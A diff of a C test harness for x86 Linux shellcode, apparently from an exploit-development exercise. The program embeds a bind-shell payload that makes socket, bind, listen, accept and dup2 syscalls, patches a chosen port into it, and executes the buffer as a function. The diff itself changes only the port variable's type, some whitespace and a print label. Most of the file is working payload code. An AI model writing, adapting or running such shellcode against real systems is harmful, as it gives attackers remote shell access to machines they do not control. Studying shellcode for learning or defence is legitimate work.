@@ -9,7 +9,7 @@
 #define PORT 29 // 0xd204 -> \x04\xd2
 
 int main(int argc, char* argv[]) {
-    unsigned char shellcode[] = \ 
+    unsigned char shellcode[] = \
 	    "\x31\xc0\x31\xdb\x31\xd2\x31\xf6\xb0\x66\xb3\x01\x52\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66"
 	    "\xfe\xc3\x52\x66\x68\x04\xd2\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x52\x56\x89\xe1\x83"
 	    "\xc3\x02\xb0\x66\xcd\x80\xb0\x66\xfe\xc3\x52\x52\x56\x89\xe1\xcd\x80\x89\xc3\x31\xc9\xb0\x3f\xcd"
@@ -21,12 +21,12 @@ int main(int argc, char* argv[]) {
         return -1;
     }
     // provide binary form for port in order to be able to execute with shellcode  
-    unsigned short port = htons(atoi(argv[1]));
+    unsigned int port = htons(atoi(argv[1]));
 	
     // copy the new port in the right shellcode offset 
     memcpy(&shellcode[PORT], &port, 2);
 
-    printf("Length:  %d\n", strlen(shellcode));
+    printf("[!] Length:  %d\n", strlen(shellcode));
 
     int (*ret)() = (int(*)())shellcode;
 
